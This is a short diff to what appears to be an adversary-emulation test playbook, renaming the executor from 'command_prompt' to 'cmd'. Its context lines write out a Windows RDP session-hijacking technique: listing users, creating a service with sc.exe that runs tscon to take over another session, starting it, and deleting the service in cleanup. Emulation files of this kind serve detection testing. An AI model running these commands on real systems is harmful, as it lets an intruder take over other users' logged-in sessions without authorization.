@@ -27,8 +27,8 @@ steps:
         query user
         sc.exe create sesshijack binpath= "cmd.exe /k tscon {{.Args.Session_ID}} /dest:{{.Args.Destination_ID}}"
         net start sesshijack
-      executor: command_prompt
+      executor: cmd
       cleanup:
         inline: |
             sc.exe delete sesshijack >nul 2>&1
-        executor: command_prompt
+        executor: cmd
